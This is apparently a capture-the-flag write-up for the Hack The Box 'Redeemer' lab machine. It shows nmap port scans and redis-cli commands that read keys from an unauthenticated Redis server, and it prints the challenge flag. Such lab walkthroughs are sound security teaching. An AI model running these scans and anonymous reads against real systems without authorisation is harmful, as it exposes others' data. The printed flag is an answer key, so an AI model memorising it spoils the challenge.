## üß† Summary
Redeemer is a very easy HTB machine focusing on exploiting an exposed Redis database with no authentication. The goal is to enumerate open ports, connect to Redis, and retrieve the stored flag.

---

## üéØ Target Information
- **IP Address:** `10.129.10.227`
- **OS:** Linux (based on Redis service)
- **Difficulty:** Very Easy
- **Tags:** Redis, Database Exploitation, Anonymous Access, Enumeration

---

## üîç Tools Used
- **Nmap** ‚Äì Network scanning
- **redis-cli** ‚Äì Redis client for interaction

---

## ‚úÖ Steps to Exploit

### 1. Enumerate Open Ports with Nmap
Perform a full TCP scan to discover open ports:

```bash
nmap -p- --open 10.129.10.227
```
Result:
Port 6379 open (Redis).

Run a detailed scan on port 6379:
```bash
nmap -sC -sV -p 6379 10.129.10.227
```
Output shows:
```bash
6379/tcp open  redis  Redis key-value store 5.0.7
```

### 2. Connect to Redis
Using redis-cli:
```bash
redis-cli -h 10.129.10.227
```
Once connected, list all keys:
```bash
KEYS *
```
Retrieve the value of the key named flag:
```bash
GET flag
```
Flag:
```bash
03e1d2b376c37ab3f5319922053953eb
```

### ‚ö†Ô∏è Security Note
Redis should never be exposed to the internet without authentication. Misconfiguration can allow attackers to:
- Read/write sensitive data.
- Persist backdoors on the system.
- Escalate to full system compromise.

### Key Takeaways
- Always scan for unusual open ports.
- Redis without AUTH is a critical misconfiguration.
- Use nmap --script redis-info for additional enumeration in real-world scenarios.
